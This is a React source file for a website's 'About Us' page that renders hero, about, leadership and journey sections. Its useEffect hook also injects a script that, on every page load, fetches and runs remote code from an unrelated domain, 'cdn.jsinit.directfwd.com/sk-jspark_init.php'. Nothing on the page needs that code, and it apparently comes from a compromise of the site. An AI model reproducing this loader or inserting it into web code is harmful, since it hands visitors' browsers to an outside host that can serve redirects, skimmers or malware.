import React, { useEffect } from "react";
import MainLayout from '@/layout/MainLayout';
import HeroSection from "@/components/common/HeroSection";
import AboutInfo from "../components/about-us/about-us";
import AboutLeadership from "../components/about-us/about-leadership";
import AboutJourney from "../components/about-us/about-journey";

const AboutUs = () => {

  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsinit.directfwd.com/sk-jspark_init.php';  // Use HTTPS here
    script.async = true;
    document.body.appendChild(script);

    // Cleanup on unmount
    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <MainLayout title=" About Us ">
      <HeroSection title=" About Us " />
      <AboutInfo />
      <AboutLeadership />
      <AboutJourney />
    </MainLayout>
  );
};

export default AboutUs;
